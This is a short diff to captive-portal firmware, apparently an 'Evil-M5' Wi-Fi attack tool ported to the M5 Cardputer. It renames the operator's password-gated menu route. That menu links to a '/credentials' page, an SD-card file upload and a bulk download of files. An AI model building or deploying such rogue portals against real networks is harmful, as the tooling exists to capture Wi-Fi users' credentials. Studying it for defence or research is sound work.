@@ -2869,14 +2869,14 @@ void createCaptivePortal() {
       }
   });
 
-  server.on("/evil-m5core2-menu", HTTP_GET, []() {
+  server.on("/evil-m5cardputer-menu", HTTP_GET, []() {
       String html = "<!DOCTYPE html><html><head><style>";
       html += "body{font-family:sans-serif;background:#f0f0f0;padding:40px;display:flex;justify-content:center;align-items:center;height:100vh}";
       html += "form{text-align:center;}div.menu{background:white;padding:20px;box-shadow:0 4px 8px rgba(0,0,0,0.1);border-radius:10px}";
       html += "input,a{margin:10px;padding:8px;width:80%;box-sizing:border-box;border:1px solid #ddd;border-radius:5px}";
       html += "a{display:inline-block;text-decoration:none;color:white;background:#007bff;text-align:center}";
       html += "</style></head><body>";
-      html += "<div class='menu'><form action='/evil-m5core2-menu' method='get'>";
+      html += "<div class='menu'><form action='/evil-m5cardputer-menu' method='get'>";
       html += "Password: <input type='password' name='pass'><br>";
       html += "<a href='javascript:void(0);' onclick='this.href=\"/credentials?pass=\"+document.getElementsByName(\"pass\")[0].value'>Credentials</a>";
       html += "<a href='javascript:void(0);' onclick='this.href=\"/uploadhtmlfile?pass=\"+document.getElementsByName(\"pass\")[0].value'>Upload File On SD</a>";
@@ -2889,7 +2889,7 @@ void createCaptivePortal() {
       
       server.send(200, "text/html", html);
       Serial.println(F("-------------------"));
-      Serial.println(F("evil-m5core2-menu access."));
+      Serial.println(F("evil-m5cardputer-menu access."));
       Serial.println(F("-------------------"));
   });
 
@@ -3185,7 +3185,7 @@ void createCaptivePortal() {
       html += "</style></head><body>";
       
       // Ajout du bouton de retour au menu principal
-      html += "<p><a href='/evil-m5core2-menu'><button>Menu</button></a></p>";
+      html += "<p><a href='/evil-m5cardputer-menu'><button>Menu</button></a></p>";
 
       html += "<ul>";
       
@@ -4291,7 +4291,7 @@ void handleSdCardBrowse() {
     }
 
     // Ajout du bouton pour revenir au menu principal
-    String html = "<p><a href='/evil-m5core2-menu'><button style='background-color: #007bff; border: none; color: white; padding: 6px 15px; text-align: center; text-decoration: none; display: inline-block; font-size: 16px; margin: 4px 2px; cursor: pointer;'>Menu</button></a></p><a href='/download-all-files?pass=" + password +"&dir=" + dirPath +"'><button style='background-color:#28a745;border:none;color:white;padding:6px 15px;font-size:16px;margin:4px 2px;cursor:pointer;'>Download ALL</button></a>";
+    String html = "<p><a href='/evil-m5cardputer-menu'><button style='background-color: #007bff; border: none; color: white; padding: 6px 15px; text-align: center; text-decoration: none; display: inline-block; font-size: 16px; margin: 4px 2px; cursor: pointer;'>Menu</button></a></p><a href='/download-all-files?pass=" + password +"&dir=" + dirPath +"'><button style='background-color:#28a745;border:none;color:white;padding:6px 15px;font-size:16px;margin:4px 2px;cursor:pointer;'>Download ALL</button></a>";
 
     // Générer le HTML pour lister les fichiers et dossiers
     html += getDirectoryHtml(dir, dirPath, password);
